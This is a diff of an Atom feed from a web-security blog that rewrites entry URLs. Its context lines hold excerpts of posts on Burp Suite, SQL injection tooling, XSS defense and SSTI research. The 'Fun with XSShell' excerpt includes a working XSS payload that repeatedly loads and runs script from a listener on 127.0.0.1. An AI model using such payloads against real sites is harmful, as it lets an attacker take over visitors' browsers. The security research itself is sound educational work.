@@ -1,20 +1,20 @@
 <?xml version="1.0" encoding="utf-8"?>
 <feed xmlns="http://www.w3.org/2005/Atom">
   <title type="text">Recent Articles</title>
-  <id>https://www.lanmaster53.com/feed.atom</id>
+  <id>https://www.lanmaster53.com/atom.xml</id>
   <updated>2019-02-21T00:00:00Z</updated>
   <link href="https://www.lanmaster53.com/" />
-  <link href="https://www.lanmaster53.com/feed.atom" rel="self" />
+  <link href="https://www.lanmaster53.com/atom.xml" rel="self" />
   <author>
     <name>Tim Tomes</name>
   </author>
   <generator>Werkzeug</generator>
-  <entry xml:base="https://www.lanmaster53.com/feed.atom">
+  <entry xml:base="https://www.lanmaster53.com/atom.xml">
     <title type="text">Burp Suite Pro v2 Transition</title>
-    <id>https://www.lanmaster53.com/posts/2019-02-21-burp-suite-pro-v2-transition</id>
+    <id>https://www.lanmaster53.com/2019/02/21/burp-suite-pro-v2-transition</id>
     <updated>2019-02-21T00:00:00Z</updated>
     <published>2019-02-21T00:00:00Z</published>
-    <link href="https://www.lanmaster53.com/posts/2019-02-21-burp-suite-pro-v2-transition" />
+    <link href="https://www.lanmaster53.com/2019/02/21/burp-suite-pro-v2-transition" />
     <content type="html">&lt;p&gt;Most of you are probably well aware of the ongoing beta for Burp Suite Pro v2. While Portswigger recommends continuing to use the latest v1 stable version for commercial testing, many are anxious to get started with the features that Portswigger shared with us last year. Let me help you. I've been actively transitioning for six months now and would like to share with you a resource I've built along the way.&lt;/p&gt;
 &lt;!-- READMORE --&gt;
 
@@ -22,12 +22,12 @@
 &lt;p&gt;I began making the transition to Burp Suite Pro v2 in my training courses as soon as it was released last year. During this time, I've learned a ton about what the new feature set is, isn't, and how it impacts the workflow afforded by the previous version. As classes have come and gone using the beta version, I've compiled a library of questions and answers from dialog between folks at Portswigger and myself. I've chosen to share that information with the public as much of the information will be extremely helpful in making the transition. Some is good news, and some is bad news, but it's all useful.&lt;/p&gt;
 &lt;p&gt;I am actively maintaining this information on a Google Doc titled &lt;a href=&quot;https://docs.google.com/document/d/1vvYguq-s5VnkR51eBvXtORenzxI1U9vLtg80tRt38Do&quot;&gt;Burp Suite 2.0 FAQ&lt;/a&gt;. I add and date questions when I send them, then update the date when I receive an answer, so hopefully that will make it easier to check back in frequently and find the new stuff. I hope you find it useful. As always, feedback is welcome.&lt;/p&gt;</content>
   </entry>
-  <entry xml:base="https://www.lanmaster53.com/feed.atom">
+  <entry xml:base="https://www.lanmaster53.com/atom.xml">
     <title type="text">Get Off Your Butt and Teach Your Kids to Code</title>
-    <id>https://www.lanmaster53.com/posts/2018-12-08-get-off-your-butt-and-teach-your-kids-to-code</id>
+    <id>https://www.lanmaster53.com/2018/12/08/get-off-your-butt-and-teach-your-kids-to-code</id>
     <updated>2018-12-08T00:00:00Z</updated>
     <published>2018-12-08T00:00:00Z</published>
-    <link href="https://www.lanmaster53.com/posts/2018-12-08-get-off-your-butt-and-teach-your-kids-to-code" />
+    <link href="https://www.lanmaster53.com/2018/12/08/get-off-your-butt-and-teach-your-kids-to-code" />
     <content type="html">&lt;p&gt;If you're my age (born in the early 1980s) and know how to code, then it has likely been a differentiator for you in your career. I can't think of a single thing I've done professionally where my ability to understand programming concepts and write code has not benefited me in some way. However, coding is fast becoming a more common skill set amongst the younger generations. Teaching our kids to code is now more of a necessity and less of a luxury.&lt;/p&gt;
 &lt;!-- READMORE --&gt;
 
@@ -41,12 +41,12 @@
 &lt;p&gt;This is where we left off. It was a ton of fun, took a good bit of time, and everyone walked away unscathed... except for a few bruises and broken toes (I was dedicated to the part). I will eventually parlay this into something more closely tied to computer programming, but this was a great way to introduce my children to programming concepts, even though they have no idea that's what they were doing. &lt;/p&gt;
 &lt;p&gt;I'd love to hear some feedback on this. Especially if you have ideas on ways to make it better, or other examples of ways to introduce more complex constructs like functions, etc. Let me know what you come up with!&lt;/p&gt;</content>
   </entry>
-  <entry xml:base="https://www.lanmaster53.com/feed.atom">
+  <entry xml:base="https://www.lanmaster53.com/atom.xml">
     <title type="text">XSS Active Defense</title>
-    <id>https://www.lanmaster53.com/posts/2018-06-18-xss-active-defense</id>
+    <id>https://www.lanmaster53.com/2018/06/18/xss-active-defense</id>
     <updated>2018-06-18T00:00:00Z</updated>
     <published>2018-06-18T00:00:00Z</published>
-    <link href="https://www.lanmaster53.com/posts/2018-06-18-xss-active-defense" />
+    <link href="https://www.lanmaster53.com/2018/06/18/xss-active-defense" />
     <content type="html">&lt;p&gt;While I don't do active defense in any part of my professional life, I enjoy developing active defense techniques for web technologies. Lately I've been dabbling in active defense mechanisms for Cross-Site Scripting (XSS) attacks, and as the developer of the HoneyBadger geolocation framework, incorporating the research into new reporting techniques and agents.&lt;/p&gt;
 &lt;!-- READMORE --&gt;
 
@@ -86,12 +86,12 @@
 
 &lt;p&gt;These agents cannot be used together. Using them together will only allow the XSS-Protection agent to trigger, as described above. I recommend the Content-Security-Policy agent for any environment that already has it implemented, and the XSS-Protection agent for those that don't. However, be mindful that the headers these agents use are only supported by some browsers. To see the Content-Security-Policy agent in action, check out a target demo page on any deployed HoneyBadger instance.&lt;/p&gt;</content>
   </entry>
-  <entry xml:base="https://www.lanmaster53.com/feed.atom">
+  <entry xml:base="https://www.lanmaster53.com/atom.xml">
     <title type="text">SQLi Exploiter: Exploiting Complex SQL Injections</title>
-    <id>https://www.lanmaster53.com/posts/2018-05-24-sqli-exploiter-exploiting-complex-sqli</id>
+    <id>https://www.lanmaster53.com/2018/05/24/sqli-exploiter-exploiting-complex-sqli</id>
     <updated>2018-05-24T00:00:00Z</updated>
     <published>2018-05-24T00:00:00Z</published>
-    <link href="https://www.lanmaster53.com/posts/2018-05-24-sqli-exploiter-exploiting-complex-sqli" />
+    <link href="https://www.lanmaster53.com/2018/05/24/sqli-exploiter-exploiting-complex-sqli" />
     <content type="html">&lt;p&gt;Raise your hand if you've ever had sqlmap fail to find or exploit a vulnerability you knew to exist? I imagine there's a lot of folks with their hands up right now. Okay, put your hands down.&lt;/p&gt;
 &lt;!-- READMORE --&gt;
 
@@ -102,12 +102,12 @@
 &lt;p&gt;&lt;a href=&quot;https://github.com/lanmaster53/sqli-exploiter&quot;&gt;https://github.com/lanmaster53/sqli-exploiter&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;Be warned, this is not a script kiddie tool. Usage requires detailed knowledge of the vulnerability, a thorough understand of the functionality available in the affected RDBMS, and the ability to write Python. However, the good news is that it is highly configurable as a result. I can't imagine an injection scenario that it can't be configured to exploit. Give it a shot and let me know what you think.&lt;/p&gt;</content>
   </entry>
-  <entry xml:base="https://www.lanmaster53.com/feed.atom">
+  <entry xml:base="https://www.lanmaster53.com/atom.xml">
     <title type="text">Report Spam. Get Owned.</title>
-    <id>https://www.lanmaster53.com/posts/2018-03-15-report-spam-get-owned</id>
+    <id>https://www.lanmaster53.com/2018/03/15/report-spam-get-owned</id>
     <updated>2018-03-15T00:00:00Z</updated>
     <published>2018-03-15T00:00:00Z</published>
-    <link href="https://www.lanmaster53.com/posts/2018-03-15-report-spam-get-owned" />
+    <link href="https://www.lanmaster53.com/2018/03/15/report-spam-get-owned" />
     <content type="html">&lt;p&gt;So, a couple weeks ago Matt Svensson (&lt;a href=&quot;https://twitter.com/TechNerdings&quot;&gt;@TechNerdings&lt;/a&gt;) dropped me a DM in Twitter:&lt;/p&gt;
 &lt;blockquote&gt;
 &lt;p&gt;Random other thing that I am curious if you guys have seen anything on... I just got an email from the local eye clinic.  I hit the &quot;spam&quot; button on Gmail to report spam and unsubscribe. What I didn't realize is that it actually opens the unsubscribe link in the browser. Good news, easy unsubscribe. Maybe.....if you properly craft the spam...you could use the unsubscribe button to open a malicious web page?&lt;/p&gt;
@@ -148,12 +148,12 @@
 &lt;p&gt;Thanks Google.&lt;/p&gt;
 &lt;p&gt;If the bug is ever made public, it will be available &lt;a href=&quot;https://issuetracker.google.com/issues/74233153&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;</content>
   </entry>
-  <entry xml:base="https://www.lanmaster53.com/feed.atom">
+  <entry xml:base="https://www.lanmaster53.com/atom.xml">
     <title type="text">Cooling Down the Hottest Ticket in Town</title>
-    <id>https://www.lanmaster53.com/posts/2017-08-26-cooling-down-the-hottest-ticket-in-town</id>
+    <id>https://www.lanmaster53.com/2017/08/26/cooling-down-the-hottest-ticket-in-town</id>
     <updated>2017-08-26T00:00:00Z</updated>
     <published>2017-08-26T00:00:00Z</published>
-    <link href="https://www.lanmaster53.com/posts/2017-08-26-cooling-down-the-hottest-ticket-in-town" />
+    <link href="https://www.lanmaster53.com/2017/08/26/cooling-down-the-hottest-ticket-in-town" />
     <content type="html">&lt;p&gt;We had an interesting conversation on the Proverbs Hackers mailing list today about getting tickets for popular conferences that have limited ticket sales. Security conferences most often thought of in this category are DerbyCon and ShmooCon. For anyone that has tried to get tickets to one of these conferences in the traditional fashion, you know the struggle is real. The conversation got me thinking about ways you can acquire a ticket that you may not realize are available. Below is the result of that thought exercise.&lt;/p&gt;
 &lt;!-- READMORE --&gt;
 
@@ -166,12 +166,12 @@
 &lt;/ol&gt;
 &lt;p&gt;So, perhaps this will open a door for someone that really wants to get a ticket to a conference, but thought they were out of options. If you happen to use one of these techniques and it works, I'd love to hear your success story. Good luck, and happy hunting. It's officially conference season.&lt;/p&gt;</content>
   </entry>
-  <entry xml:base="https://www.lanmaster53.com/feed.atom">
+  <entry xml:base="https://www.lanmaster53.com/atom.xml">
     <title type="text">Handling Missed Vulnerabilities</title>
-    <id>https://www.lanmaster53.com/posts/2017-04-05-handling-missed-vulnerabilities</id>
+    <id>https://www.lanmaster53.com/2017/04/05/handling-missed-vulnerabilities</id>
     <updated>2017-04-05T00:00:00Z</updated>
     <published>2017-04-05T00:00:00Z</published>
-    <link href="https://www.lanmaster53.com/posts/2017-04-05-handling-missed-vulnerabilities" />
+    <link href="https://www.lanmaster53.com/2017/04/05/handling-missed-vulnerabilities" />
     <content type="html">&lt;p&gt;(Originally posted at &lt;a href=&quot;https://nvisium.com/blog/2017/04/05/handling-missed-vulnerabilities/&quot;&gt;https://nvisium.com/blog/2017/04/05/handling-missed-vulnerabilities/&lt;/a&gt;.)&lt;/p&gt;
 &lt;p&gt;&lt;a href=&quot;https://twitter.com/digininja&quot;&gt;Robin &quot;digininja&quot; Wood&lt;/a&gt; wrote &lt;a href=&quot;https://digi.ninja/blog/missing_a_vuln.php&quot;&gt;this&lt;/a&gt; interesting article about the impact of missing vulnerabilities during security assessments. He makes a lot of good points, and the reality is, it's something we all deal with. Robin talks about how missing a vulnerability can be the end of one's career, or at least a large step backward. While this is true, his article only addresses the impact at a micro level. I'd like to expand on that.&lt;/p&gt;
 &lt;!-- READMORE --&gt;
@@ -214,12 +214,12 @@
 &lt;h3&gt;Wrapping Up&lt;/h3&gt;
 &lt;p&gt;So it's going to happen, and someone is going to be dealing with the fallout. Chances are it won't be comfortable, but if the organization has implemented controls to reduce the frequency, and prepared themselves for occassions where the controls fail, they'll be equipped and prepared to limit the damage and ultimately live to test another day.&lt;/p&gt;</content>
   </entry>
-  <entry xml:base="https://www.lanmaster53.com/feed.atom">
+  <entry xml:base="https://www.lanmaster53.com/atom.xml">
     <title type="text">Proxying thru Virtual Client VPNs</title>
-    <id>https://www.lanmaster53.com/posts/2016-12-01-proxying-thru-virtual-client-vpns</id>
+    <id>https://www.lanmaster53.com/2016/12/01/proxying-thru-virtual-client-vpns</id>
     <updated>2016-12-01T00:00:00Z</updated>
     <published>2016-12-01T00:00:00Z</published>
-    <link href="https://www.lanmaster53.com/posts/2016-12-01-proxying-thru-virtual-client-vpns" />
+    <link href="https://www.lanmaster53.com/2016/12/01/proxying-thru-virtual-client-vpns" />
     <content type="html">&lt;p&gt;So, I'm sorta OCD. Anyone that knows me will attest to that. When it comes to my computing environments, I can't stand clutter. That includes both the external and internal components of my computing environment. One particular point of interest for me is the number of applications installed on my system. I've always felt like limiting the amount of software on my system to only what I needed, and avoiding endless install and uninstall cycles, has resulted in a more stable system. I have no scientific proof to back this up, but it's always worked for me, so I like to keep my system clean and tidy. However, in my line of work, where one-off tools for testing and research abound, this is a daily challenge.&lt;/p&gt;
 &lt;!-- READMORE --&gt;
 
@@ -244,12 +244,12 @@
 &lt;/ol&gt;
 &lt;p&gt;See the &lt;a href=&quot;/burp-visual-aids/&quot;&gt;Burp Suite Visual Aids project page&lt;/a&gt; for a picture of what this configuration looks like.&lt;/p&gt;</content>
   </entry>
-  <entry xml:base="https://www.lanmaster53.com/feed.atom">
+  <entry xml:base="https://www.lanmaster53.com/atom.xml">
     <title type="text">Fun with XSShell</title>
-    <id>https://www.lanmaster53.com/posts/2016-07-15-fun-with-xsshell</id>
+    <id>https://www.lanmaster53.com/2016/07/15/fun-with-xsshell</id>
     <updated>2016-07-15T00:00:00Z</updated>
     <published>2016-07-15T00:00:00Z</published>
-    <link href="https://www.lanmaster53.com/posts/2016-07-15-fun-with-xsshell" />
+    <link href="https://www.lanmaster53.com/2016/07/15/fun-with-xsshell" />
     <content type="html">&lt;p&gt;So this is kinda fun. With this page open, copy and paste one of the listener commands from below into a terminal window on your local machine. Then, paste &lt;code&gt;alert(42)&lt;/code&gt; into the resulting shell and press &quot;Enter&quot;. Once you recover from the initial shock of what you just witnessed, play with the following payloads and spend the next hour of life thoroughly enjoying yourself.&lt;/p&gt;
 &lt;!-- READMORE --&gt;
 
@@ -309,12 +309,12 @@
 &lt;p&gt;&lt;svg/onload=setInterval(function(){d=document;try{d.getElementById(&quot;x&quot;).remove()}catch(e){};z=d.createElement(&quot;script&quot;);z.id=&quot;x&quot;;z.src=&quot;http://127.0.0.1:8000&quot;;d.body.appendChild(z)},3000)&gt;&lt;/p&gt;
 &lt;p&gt;Check the source code here ^^^ for the active payload.&lt;/p&gt;</content>
   </entry>
-  <entry xml:base="https://www.lanmaster53.com/feed.atom">
+  <entry xml:base="https://www.lanmaster53.com/atom.xml">
     <title type="text">Exploring SSTI in Flask/Jinja2 - Part 2</title>
-    <id>https://www.lanmaster53.com/posts/2016-03-11-exploring-ssti-flask-jinja2-part-2</id>
+    <id>https://www.lanmaster53.com/2016/03/11/exploring-ssti-flask-jinja2-part-2</id>
     <updated>2016-03-11T00:00:00Z</updated>
     <published>2016-03-11T00:00:00Z</published>
-    <link href="https://www.lanmaster53.com/posts/2016-03-11-exploring-ssti-flask-jinja2-part-2" />
+    <link href="https://www.lanmaster53.com/2016/03/11/exploring-ssti-flask-jinja2-part-2" />
     <content type="html">&lt;p&gt;I recently wrote &lt;a href=&quot;/2016/03/09/exploring-ssti-flask-jinja2/&quot;&gt;this article&lt;/a&gt; about exploring the true impact of Server-Side Template Injection (SSTI) in applications leveraging the Flask/Jinja2 development stack. My initial goal was to find a path to file or operating system access. I was previously unable to do so, but thanks to some feedback on the initial article, I have since been able to achieve that goal. This article is the result of the additional research.&lt;/p&gt;
 &lt;!-- READMORE --&gt;
 
